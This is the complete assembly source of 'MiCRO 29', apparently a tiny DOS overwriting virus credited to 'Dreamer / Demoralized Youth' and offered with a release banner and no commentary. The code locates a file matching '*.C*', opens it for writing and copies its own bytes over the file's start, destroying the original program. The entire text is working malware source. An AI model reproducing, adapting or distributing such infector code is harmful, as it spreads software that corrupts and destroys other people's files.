; #############################################################################
; ###                                                                       ###
; ###                             M i C R O   29                            ###
; ###                                                                       ###
; ###                                  By                                   ###
; ###                                                                       ###
; ###                      Dreamer / Demoralized Youth                      ###
; ###                                                                       ###
; #############################################################################

        MOV     AH,4Eh                  ;Dos Universal:  FIND FIRST
        MOV     DX,OFFSET PATT
        INT     21h
        MOV     AX,3D02h                ;Dos Universal:  OPEN HANDLE
        MOV     DX,9Eh
        INT     21h
        XCHG    AX,BX
        MOV     AH,40h                  ;Dos Universal:  WRITE TO HANDLE
        ADD     DX,62h
        INT     21h
        RET

PATT    DB      '*.C*',0
